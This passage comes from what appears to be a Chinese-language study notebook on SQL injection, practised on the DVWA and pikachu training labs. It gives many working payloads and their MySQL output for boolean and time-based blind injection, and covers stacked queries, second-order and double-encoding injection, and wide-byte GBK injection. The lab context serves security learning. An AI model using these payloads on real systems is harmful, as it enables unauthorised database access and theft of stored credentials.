+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
| substr(<span style="color: #8b2252;">'dvwa'</span>,2,1) |
+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
| v                  |
+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>

mysql&gt; <span style="color: #a020f0;">select</span> substr(<span style="color: #8b2252;">'dvwa'</span>,2,2);
+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
| substr(<span style="color: #8b2252;">'dvwa'</span>,2,2) |
+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
| vw                 |
+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>

mysql&gt; <span style="color: #a020f0;">select</span> ascii(<span style="color: #8b2252;">'d'</span>);
+<span style="color: #b22222;">------------</span><span style="color: #b22222;">+</span>
| ascii(<span style="color: #8b2252;">'d'</span>) |
+<span style="color: #b22222;">------------</span><span style="color: #b22222;">+</span>
|        100 |
+<span style="color: #b22222;">------------</span><span style="color: #b22222;">+</span>

mysql&gt; <span style="color: #a020f0;">select</span> <span style="color: #228b22;">char</span>(100) ;
+<span style="color: #b22222;">-----------</span><span style="color: #b22222;">+</span>
| <span style="color: #228b22;">char</span>(100) |
+<span style="color: #b22222;">-----------</span><span style="color: #b22222;">+</span>
| d         |

</pre>
</div>

<p>
最终语句
</p>
<div class="org-src-container">
<pre class="src src-sh">1<span style="color: #8b2252;">' and ascii(substr(database(),1,1))&gt;88;# exists</span>
<span style="color: #8b2252;">1'</span> and ascii(substr(database(),1,1))&gt;98;<span style="color: #b22222;"># </span><span style="color: #b22222;">exists</span>
1<span style="color: #8b2252;">' and ascii(substr(database(),1,1))&gt;100;# MISSING</span>
<span style="color: #8b2252;">1'</span> and ascii(substr(database(),1,1))=100;<span style="color: #b22222;"># </span><span style="color: #b22222;">exists</span>
</pre>
</div>

<p>
数据库名称的首位字符对应的ASCII码为100，查询是字母 d
</p>

<p>
类似以上操作，分别猜解第2/3/4位元素的字符：
</p>
<div class="org-src-container">
<pre class="src src-sh">1<span style="color: #8b2252;">' and ascii(substr(database(),2,1))=118;# &#31532;2&#20301;&#23383;&#31526;&#20026; v</span>
<span style="color: #8b2252;">1'</span> and ascii(substr(database(),3,1))=119;<span style="color: #b22222;"># </span><span style="color: #b22222;">&#31532;3&#20301;&#23383;&#31526;&#20026; w</span>
1<span style="color: #8b2252;">' and ascii(substr(database(),4,1))=97;# &#31532;4&#20301;&#23383;&#31526;&#20026; a</span>
</pre>
</div>

<p>
从而，获取到当前连接数据库的名称为：dvwa
</p>

<p>
<b>3.猜解数据库中的表名</b>
</p>

<p>
1）猜解表的个数
</p>

<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;10;# MISSING</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> (<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">count</span>(<span style="color: #a020f0;">table_name</span>) <span style="color: #a020f0;">from</span> information_schema.tables <span style="color: #a020f0;">where</span> table_schema=database())&gt;5;# MISSING
1<span style="color: #8b2252;">' and (select count(table_name) from information_schema.tables where table_schema=database())&gt;2;# MISSING</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> (<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">count</span>(<span style="color: #a020f0;">table_name</span>) <span style="color: #a020f0;">from</span> information_schema.tables <span style="color: #a020f0;">where</span> table_schema=database())=2;# <span style="color: #a020f0;">exists</span>
</pre>
</div>

<p>
dvwa数据库中表的个数=2
</p>

<p>
2）猜解表名
猜解dvwa数据库中第1个表的名称字符长度=9
</p>

<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) &gt;10;# MISSION</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">length</span>((<span style="color: #a020f0;">select</span> <span style="color: #a020f0;">table_name</span> <span style="color: #a020f0;">from</span> information_schema.tables <span style="color: #a020f0;">where</span> table_schema=database() <span style="color: #a020f0;">limit</span> 0,1)) &gt;5;# exist
1<span style="color: #8b2252;">' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) &gt;8;# exist</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">length</span>((<span style="color: #a020f0;">select</span> <span style="color: #a020f0;">table_name</span> <span style="color: #a020f0;">from</span> information_schema.tables <span style="color: #a020f0;">where</span> table_schema=database() <span style="color: #a020f0;">limit</span> 0,1)) = 9;# exist

&#20063;&#21487;&#20197;&#20889;&#25104;&#65306;
1<span style="color: #8b2252;">' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9;# exists</span>
</pre>
</div>

<p>
依次取出dvwa数据库第1个表的第1/2/&#x2026;/9个字符分别猜解：
</p>

<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;88;# exists</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> ascii(substr((<span style="color: #a020f0;">select</span> <span style="color: #a020f0;">table_name</span> <span style="color: #a020f0;">from</span> information_schema.tables <span style="color: #a020f0;">where</span> table_schema=database() <span style="color: #a020f0;">limit</span> 0,1),1,1))&gt;105;# MISSING
1<span style="color: #8b2252;">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;96;# exists</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> ascii(substr((<span style="color: #a020f0;">select</span> <span style="color: #a020f0;">table_name</span> <span style="color: #a020f0;">from</span> information_schema.tables <span style="color: #a020f0;">where</span> table_schema=database() <span style="color: #a020f0;">limit</span> 0,1),1,1))&gt;101;# <span style="color: #a020f0;">exists</span>
1<span style="color: #8b2252;">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103;# MISSING</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> ascii(substr((<span style="color: #a020f0;">select</span> <span style="color: #a020f0;">table_name</span> <span style="color: #a020f0;">from</span> information_schema.tables <span style="color: #a020f0;">where</span> table_schema=database() <span style="color: #a020f0;">limit</span> 0,1),1,1))=102;# MISSING
1<span style="color: #8b2252;">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103;# exists</span>
</pre>
</div>

<p>
dvwa数据库第1个表的第1个字符的ASCII码=103，对应的字符为g
</p>

<p>
依次猜解出其他位置的字符分别为：u、e、s、t、b、o、o、k
</p>

<p>
从而dvwa数据库第1个表的名称为：guestbook
</p>

<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))&gt;88;#</span>
</pre>
</div>

<p>
猜解出dvwa数据库第2个表的名称为：users
</p>

<p>
<b>4.猜解表中的字段名</b>
</p>

<p>
以[dvwa库-users表]为例：
</p>

<p>
1）猜解users表中的字段个数
</p>
<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='</span>users<span style="color: #8b2252;">')&gt;10;# MISSING</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> (<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">count</span>(<span style="color: #a020f0;">column_name</span>) <span style="color: #a020f0;">from</span> information_schema.columns <span style="color: #a020f0;">where</span> table_schema=database() <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">table_name</span>=<span style="color: #8b2252;">'users'</span>)&gt;5;# <span style="color: #a020f0;">exists</span>
1<span style="color: #8b2252;">' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='</span>users<span style="color: #8b2252;">')&gt;8;# MISSING</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> (<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">count</span>(<span style="color: #a020f0;">column_name</span>) <span style="color: #a020f0;">from</span> information_schema.columns <span style="color: #a020f0;">where</span> table_schema=database() <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">table_name</span>=<span style="color: #8b2252;">'users'</span>)=8;# <span style="color: #a020f0;">exists</span>
</pre>
</div>

<p>
dvwa库的users表中有8个字段
</p>

<p>
2）猜解users表中的各个字段的名称
</p>

<p>
按照常规流程，从users表的第1个字段开始，对其猜解每一个组成字符，获取到完整的第1个字段名称&#x2026;然后是第2/3/&#x2026;/8个字段名称。
</p>

<p>
当字段数目较多、名称较长的时候，若依然按照以上方式手工猜解，则会耗费比较多的时间。当时间有限的情况下，实际上有的字段可能并不太需要获取，字段的位置也暂且不作太多关注，首先获取几个包含关键信息的字段，如：用户名、密码&#x2026;
</p>

<p>
【猜想】数据库中可能保存的字段名称
</p>
<ul class="org-ul">
<li>用户名：username/user_name/uname/u_name/user/name/&#x2026;</li>
<li>密码：password/pass_word/pwd/pass/&#x2026;</li>
</ul>

<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and (select count(*) from information_schema.columns where table_schema=database() and table_name='</span>users<span style="color: #8b2252;">' and column_name='</span>username<span style="color: #8b2252;">')=1;# MISSING</span>

<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> (<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">count</span>(*) <span style="color: #a020f0;">from</span> information_schema.columns <span style="color: #a020f0;">where</span> table_schema=database() <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">table_name</span>=<span style="color: #8b2252;">'users'</span> <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">column_name</span>=<span style="color: #8b2252;">'user_name'</span>)=1;# MISSING

1<span style="color: #8b2252;">' and (select count(*) from information_schema.columns where table_schema=database() and table_name='</span>users<span style="color: #8b2252;">' and column_name='</span>uname<span style="color: #8b2252;">')=1;# MISSING</span>

<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> (<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">count</span>(*) <span style="color: #a020f0;">from</span> information_schema.columns <span style="color: #a020f0;">where</span> table_schema=database() <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">table_name</span>=<span style="color: #8b2252;">'users'</span> <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">column_name</span>=<span style="color: #8b2252;">'u_name'</span>)=1;# MISSING

1<span style="color: #8b2252;">' and (select count(*) from information_schema.columns where table_schema=database() and table_name='</span>users<span style="color: #8b2252;">' and column_name='</span><span style="color: #483d8b;">user</span><span style="color: #8b2252;">')=1;# exists</span>

<span style="color: #8b2252;"># &#22914;&#26524;&#23384;&#22312;&#29468;&#24819;&#30340;&#23383;&#27573;,&#20182;&#30340;&#25968;&#37327;&#20026;1&#65292;&#37027;&#20040; = 1 &#26102;&#65292;1 = 1 &#36923;&#36753;&#27604;&#36739;&#21028;&#26029;&#20026;&#30495;&#65292;&#36820;&#22238;&#30340;&#26159; 1</span>
<span style="color: #8b2252;">mysql&gt; select count(*) from information_schema.columns where table_schema = database() and table_name = '</span>users<span style="color: #8b2252;">' and column_name = '</span>user222<span style="color: #8b2252;">'= 1;</span>
<span style="color: #8b2252;">+----------+</span>
<span style="color: #8b2252;">| count(*) |</span>
<span style="color: #8b2252;">+----------+</span>
<span style="color: #8b2252;">|        0 |</span>
<span style="color: #8b2252;">+----------+</span>
<span style="color: #8b2252;">1 row in set (0.00 sec)</span>

<span style="color: #8b2252;">mysql&gt; select count(*) from information_schema.columns where table_schema = database() and table_name = '</span>users<span style="color: #8b2252;">' and column_name = '</span><span style="color: #483d8b;">user</span><span style="color: #8b2252;">'= 1;</span>
<span style="color: #8b2252;">+----------+</span>
<span style="color: #8b2252;">| count(*) |</span>
<span style="color: #8b2252;">+----------+</span>
<span style="color: #8b2252;">|        1 |</span>
</pre>
</div>

<p>
users表中存在字段user
</p>

<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and (select count(*) from information_schema.columns where table_schema=database() and table_name='</span>users<span style="color: #8b2252;">' and column_name='</span>password<span style="color: #8b2252;">')=1;# exists</span>
</pre>
</div>

<p>
users表中存在字段password
</p>

<p>
至此，库名（dvwa），表名（guestbook、users），字段名（user、password）都猜出来了。
</p>

<p>
<b>5.获取表中的字段值</b>
</p>

<p>
1）用户名的字段值
</p>
<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and length(substr((select user from users limit 0,1),1))&gt;10;# MISSING</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">length</span>(substr((<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">user</span> <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">limit</span> 0,1),1))&gt;5;# MISSING
1<span style="color: #8b2252;">' and length(substr((select user from users limit 0,1),1))&gt;3;# exists</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">length</span>(substr((<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">user</span> <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">limit</span> 0,1),1))=4;# MISSING
1<span style="color: #8b2252;">' and length(substr((select user from users limit 0,1),1))=5;# exists</span>
</pre>
</div>

<p>
user字段中第1个字段值的字符长度=5，再使用ascii码的方式逐个爆破字符，步骤和上面一样，不再演示。
</p>
<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and ascii(substr((select user from users limit 0,1),1,1))&gt;97;# MISSING</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> ascii(substr((<span style="color: #a020f0;">select</span> <span style="color: #483d8b;">user</span> <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">limit</span> 0,1),1,1))=97;# <span style="color: #a020f0;">exists</span>
</pre>
</div>

<p>
2）密码的字段值
</p>

<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and length(substr((select password from users limit 0,1),1))&gt;10;# exists</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">length</span>(substr((<span style="color: #a020f0;">select</span> password <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">limit</span> 0,1),1))&gt;20;# <span style="color: #a020f0;">exists</span>
1<span style="color: #8b2252;">' and length(substr((select password from users limit 0,1),1))&gt;40;# MISSING</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">length</span>(substr((<span style="color: #a020f0;">select</span> password <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">limit</span> 0,1),1))&gt;30;# <span style="color: #a020f0;">exists</span>
1<span style="color: #8b2252;">' and length(substr((select password from users limit 0,1),1))&gt;35;# MISSING</span>
<span style="color: #8b2252;">1'</span> <span style="color: #a020f0;">and</span> <span style="color: #a020f0;">length</span>(substr((<span style="color: #a020f0;">select</span> password <span style="color: #a020f0;">from</span> users <span style="color: #a020f0;">limit</span> 0,1),1))&gt;33;# MISSING
1<span style="color: #8b2252;">' and length(substr((select password from users limit 0,1),1))=32;# exists</span>
</pre>
</div>

<p>
password字段中第1个字段值的字符长度=32
</p>

<p>
猜测这么长的密码位数，可能是用来md5的加密方式保存，通过手工猜解每位数要花费的时间更久了
</p>

<p>
然后继续利用以上方法（ascii + substr）猜出密码就可以了，最终密码为
</p>

<p>
<b>6.验证字段值的有效性</b>
</p>

<p>
将以上admin&#x2013;password填写到前台登录界面的两个输入框中，尝试登录是否成功。
</p>
</div>
</div>
<div id="outline-container-h:d139c7d4-990d-4c3b-858d-08d499f4daf0" class="outline-5">
<h5 id="h:d139c7d4-990d-4c3b-858d-08d499f4daf0">时间盲注</h5>
<div class="outline-text-5" id="text-h:d139c7d4-990d-4c3b-858d-08d499f4daf0">
<p>
界面返回值只有一种 True，无论输入任何值，返回情况都会按正常的来处理。加入特定的时间函数，通过查看WEB页面返回的时间差来判断注入的语句是否正确。
</p>

<p>
<b>猜解当前连接数据库的名称</b>
</p>

<p>
对于 <b>if(判断条件,sleep(n),1)</b> 函数而言，若判断条件为真，则执行sleep(n)函数，达到在正常响应时间的基础上再延迟响应时间n秒的效果；若判断条件为假，则返回设置的1，此时不会执行sleep(n)函数。
</p>

<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and if(length(database())=4,sleep(5),1);#</span>
</pre>
</div>

<p>
以上根据响应时间的差异，可知当前连接数据库名称的字符长度=4，此时确实执行了sleep(5)函数，使得响应时间比正常响应延迟5s
</p>

<div class="org-src-container">
<pre class="src src-sql">1<span style="color: #8b2252;">' and if(ascii(substr(database(),1,1))=100,sleep(5),1);#</span>
</pre>
</div>

<p>
当前连接数据库的名称的第1个字符的ASCII码为100，对应字母d。
</p>

<p>
后续过程与上面的类似，在此略过。
</p>

<p>
范例：时间盲注 dvwa 靶场 安全等级为low
</p>
<div class="org-src-container">
<pre class="src src-sh">mysql&gt; select database();
+------------+
| database() |
+------------+
| dvwa       |
+------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select if(length(database())=5,sleep(5), 1);
+--------------------------------------+
| <span style="color: #a020f0;">if</span>(length(database())=5,sleep(5), 1) |
+--------------------------------------+
|                                    1 |
+--------------------------------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#31435;&#39532;&#36820;&#22238;&#30495;&#65292;&#25968;&#25454;&#24211;&#38271;&#24230;&#20026;&#20551;</span>

mysql&gt; select if(length(database())=4,sleep(5), 1);
+--------------------------------------+
| <span style="color: #a020f0;">if</span>(length(database())=4,sleep(5), 1) |
+--------------------------------------+
|                                    0 |
+--------------------------------------+
1 row<span style="color: #a020f0;"> in</span> set (5.00 sec) <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24211;&#38271;&#24230;&#20026;&#30495;&#26102;&#25191;&#34892;sleep&#20989;&#25968;&#12290;&#36820;&#22238;&#20551;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;dvwa&#24211;&#21517;&#38271;&#24230;&#20026;4&#26102;&#65292;&#30495;&#65292;&#21017;&#25191;&#34892;sleep(5)</span>
mysql&gt; select first_name,last_name from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span> and if(length(database())=4,sleep(5),1);<span style="color: #b22222;">#</span>
Empty set (5.00 sec)

mysql&gt; select first_name,last_name from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span> and if(ascii(substr(database(),1,1))=100,sleep(5),1);<span style="color: #b22222;">#</span>
Empty set (5.00 sec)
</pre>
</div>

<p>
<b>总结：盲注需要掌握的几种函数</b>
</p>
<ul class="org-ul">
<li>length() 返回字符串的长度</li>
<li>substr() 截取字符串 （语法:SUBSTR(str,pos,len);）</li>
<li>ascii() 返回字符的ascii码</li>
<li>sleep() 将程序挂起一段时间</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:c33bced9-e6d5-4f87-bd99-ff10d290e903" class="outline-4">
<h4 id="h:c33bced9-e6d5-4f87-bd99-ff10d290e903">堆叠查询注入</h4>
<div class="outline-text-4" id="text-h:c33bced9-e6d5-4f87-bd99-ff10d290e903">
<p>
堆叠注入，从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执行，而在真实的运用中也是这样的。我们知道在 mysql 中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。其原理也很简单，就是将原来的语句构造完后加上分号，代表该语句结束，后面再输入的就是一个全新的sql语句了，这个时候我们使用增删改查毫无限制。
</p>

<p>
<b>使用条件：</b>
</p>

<p>
堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制，只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行。但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_query()函数，只能执行一条语句，分号后面的内容将不会被执行，所以说堆叠注入的使用条件十分有限，一旦能够被使用，可能对网站造成很大的威胁。
</p>


<div class="org-src-container">
<pre class="src src-sql">#&#31532;&#19968;&#26465;&#35821;&#21477;&#26597;&#35810;&#34920;&#65292;&#31532;&#20108;&#26465;&#26597;&#35810;&#24403;&#21069;&#25968;&#25454;&#24211;&#21517;&#12290;
mysql&gt; <span style="color: #a020f0;">select</span> <span style="color: #483d8b;">user</span> <span style="color: #a020f0;">from</span> users;show databases; #
+<span style="color: #b22222;">---------</span><span style="color: #b22222;">+</span>
| <span style="color: #483d8b;">user</span>    |
+<span style="color: #b22222;">---------</span><span style="color: #b22222;">+</span>
| <span style="color: #a020f0;">admin</span>   |
| gordonb |
| 1337    |
| pablo   |
| smithy  |
+<span style="color: #b22222;">---------</span><span style="color: #b22222;">+</span>
5 <span style="color: #a020f0;">rows</span> <span style="color: #a020f0;">in</span> <span style="color: #a020f0;">set</span> (0.02 sec)

+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
| Database           |
+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
| information_schema |
| dvwa               |
| mysql              |
| performance_schema |
+<span style="color: #b22222;">--------------------</span><span style="color: #b22222;">+</span>
4 <span style="color: #a020f0;">rows</span> <span style="color: #a020f0;">in</span> <span style="color: #a020f0;">set</span> (0.00 sec)
</pre>
</div>

<p>
至此，对SQL注入分类总结一下：
</p>
</div>
<div id="outline-container-h:41e1257c-491f-4019-955d-22c34b02346d" class="outline-5">
<h5 id="h:41e1257c-491f-4019-955d-22c34b02346d">SQL注入分类总结</h5>
<div class="outline-text-5" id="text-h:41e1257c-491f-4019-955d-22c34b02346d">
<p>
提问：SQL 注入有哪些类型？
回答：
从哪些维度去说？
</p>
<ul class="org-ul">
<li>根据查询字段：数字型、字符型</li>
<li>根据查询方式：Union注入、堆叠注入</li>
<li>根据回显：报错、盲注</li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:10680bfb-fd98-4473-8b01-3451fc970b77" class="outline-4">
<h4 id="h:10680bfb-fd98-4473-8b01-3451fc970b77">二次注入</h4>
<div class="outline-text-4" id="text-h:10680bfb-fd98-4473-8b01-3451fc970b77">
<p>
在存入数据库的时候做了过滤，但是取出来的时候没有做过滤，而产生的数据库注入。
</p>

<p>
①插入恶意数据
</p>
<ul class="org-ul">
<li>在第一次向数据库插入数据的时候，仅仅只是使用了addslashes函数对其中的特殊字符进行了转义，但是addslashes函数有一个特点就是虽然参数在过滤后会添加 “\” 进行转义，但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</li>
</ul>

<p>
②引用恶意数据
</p>
<ul class="org-ul">
<li>在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</li>

<li>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</li>
</ul>

<p>
<b>二次编码注入（urldecode()与PHP本身处理编码时，两者配合失误，可构造数据消除\）</b>
</p>

<ul class="org-ul">
<li>用户输入【1%2527】=&gt;php自身编码，%25转换成%【1%27】=&gt;php未检查到单引号，不转义【1%27】=&gt;遇到一个函数编码，使代码进行编码转换【1'】=&gt;带入sql语句=&gt;能注入</li>
<li>方法：在注入点后键入%2527，然后按正常的注入流程开始注入</li>
</ul>



<figure id="org7c253ca">
<img src="./images/Snipaste_2023-06-12_11-20-12.png" alt="Snipaste_2023-06-12_11-20-12.png" width="50%">

</figure>

<p>
参考： <a href="../other/the-road-to-web-security/the-road-to-web-security.html#二次注入">二次注入</a>
</p>
</div>
</div>
<div id="outline-container-h:cc9d6a8e-f04c-4b61-a6d6-d6367a0bf6aa" class="outline-4">
<h4 id="h:cc9d6a8e-f04c-4b61-a6d6-d6367a0bf6aa">宽字节注入</h4>
<div class="outline-text-4" id="text-h:cc9d6a8e-f04c-4b61-a6d6-d6367a0bf6aa">
<p>
<b>靶场环境 pikachu 安装</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">docker pull area39/pikachu
docker run -d --name pikachu -p 8083:80 -p 33063:3306 area39/pikachu
</pre>
</div>

<p>
点击红色字体进行初始化:
</p>
<ul class="org-ul">
<li>"提示:欢迎使用,pikachu还没有初始化，点击进行初始化安装!" &#x2013;&gt; "安装/初始化" &#x2013;&gt; "点击这里进入首页"</li>
</ul>

<p>
选择”宽字节注入“模块:
</p>
<ul class="org-ul">
<li>左边栏 SQL-Injeck 中找到</li>
<li>获得测试账号密码，点右上角"点一下提示" kobe/123456</li>
</ul>

<p>
<b>宽字节概念</b>
</p>

<ol class="org-ol">
<li>单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码(0-127)。</li>
<li>多字节字符集：在多字节字符集中，一部分字符用多个字节来表示，另一部分（可能没有）用单个字节来表示。</li>
<li>宽字节注入时利用mysql的一个特性，使用GBK编码的时候，会认为两个字符是一个汉字。</li>
</ol>

<p>
<b>宽字节注入原理</b>
</p>

<p>
为了防止网站被SQL注入，一些网站开发人员会做一些防护措施，其中最常见的就是对一些特殊字符进行转义。
</p>

<p>
通过前面的学习可以了解到，SQL注入非常关键的一步就是让引号闭合和跳出引号，无法跳出引号，那么输入的内容就永远在引号里，那么输入的东西永远就是字符串，很显然这不符合SQL注入的要求。
</p>

<p>
网站开发者也想到了这一步，于是做个防护措施：转义，对输入的敏感内容、特殊字符进行转义。
</p>

<p>
<b>addslashes()函数</b>
</p>
<ol class="org-ol">
<li>addslashes() 函数在预定义字符之前添加反斜杠（\）进行转义。</li>
<li>预定义字符：空格 单引号（'），双引号（"），反斜杠（\），NULL</li>
</ol>

<p>
通过前面的SQL注入实验可以发现，字符型的注入点我们都是用单引号来判断的，但是当遇到addslashes()时，单引号会被转义，导致我们用来判断注入点的单引号失效。  <b>所以我们的目的就是使转义符 \ 失效、使单引号逃逸。</b>
</p>

<div class="org-src-container">
<pre class="src src-sh">1.kobe%df<span style="color: #8b2252;">' or 1=1#</span>
<span style="color: #8b2252;">2.kobe%df\'</span> or <span style="color: #a0522d;">1</span>=1#
    kobe%df%5c%27 or <span style="color: #a0522d;">1</span>=1# //&#21069;&#31471;&#36755;&#20837;&#30340;&#20869;&#23481;&#65292;&#32463;&#36807;&#20102;URL&#32534;&#30721;
    %df%5c = &#36939; //GBK&#32534;&#30721;
3.kobe&#36939;<span style="color: #8b2252;">' or 1=1#</span>
<span style="color: #8b2252;">select user from users where name='</span>kobe&#36939;<span style="color: #8b2252;">' or 1=1#'</span> //&#20174;&#21333;&#24341;&#21495;&#20013;&#36867;&#36920;&#20986;&#26469;
</pre>
</div>


<p>
原理：前端输入的反斜杠（\）经过URL编码后是%5c。在输入%df后，使得添加反斜杠后形成%df%5c， <b>如果程序数据库使用了GBK编码</b> ，%df%5c就会被识别成繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误。整个过程的关键点在于单引号前面的%df，造成宽字节注入使得单引号逃逸成功并闭合语句，才有了后面的操作。
</p>


<figure id="orgc16fb6f">
<img src="./images/Snipaste_2023-06-13_10-31-13.png" alt="Snipaste_2023-06-13_10-31-13.png" width="50%">

</figure>

<p>
GBK编码表：<a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php</a>
</p>


<p>
使用burpsuite工具拦截数据包发送到Repeater，输入payload <code>kobe%df' or 1=1#</code> ，可以看到爆出了所有的账户信息
</p>

<p>
后面的注入过程和前面一样，直接union注入查数据库名、表名、字段名、字段值等等，这里就不再赘述。
</p>
<ul class="org-ul">
<li>kobe%df' union select database(),version()#</li>
</ul>

<p>
<b>范例：宽字节注入</b>
</p>

<p>
输入 kobe 查询，输出如下：
</p>
<pre class="example" id="org0dc8197">
your uid:3
your email is: kobe@pikachu.com
</pre>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">docker exec -it pikachu bash</span>
root@6b4d246697c2:/# mysql

mysql&gt; use pikachu

mysql&gt; show tables;
+-------------------+
| Tables_in_pikachu |
+-------------------+
| httpinfo          |
| member            |
| message           |
| users             |
| xssblind          |
+-------------------+
5 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select * from  member;
+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+
| id | username | pw                               | sex  | phonenum    | address               | email             |
+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+
|  1 | vince    | e10adc3949ba59abbe56e057f20f883e | boy  | 18626545453 | chain                 | vince@pikachu.com |
|  2 | allen    | e10adc3949ba59abbe56e057f20f883e | boy  | 13676767767 | nba 76                | allen@pikachu.com |
|  3 | kobe     | e10adc3949ba59abbe56e057f20f883e | boy  | 15988767673 | nba lakes             | kobe@pikachu.com  |
|  4 | grady    | e10adc3949ba59abbe56e057f20f883e | boy  | 13676765545 | nba hs                | grady@pikachu.com |
|  5 | kevin    | e10adc3949ba59abbe56e057f20f883e | boy  | 13677676754 | Oklahoma City Thunder | kevin@pikachu.com |
|  6 | lucy     | e10adc3949ba59abbe56e057f20f883e | girl | 12345678922 | usa                   | lucy@pikachu.com  |
|  7 | lili     | e10adc3949ba59abbe56e057f20f883e | girl | 18656565545 | usa                   | lili@pikachu.com  |
+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+
7 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)

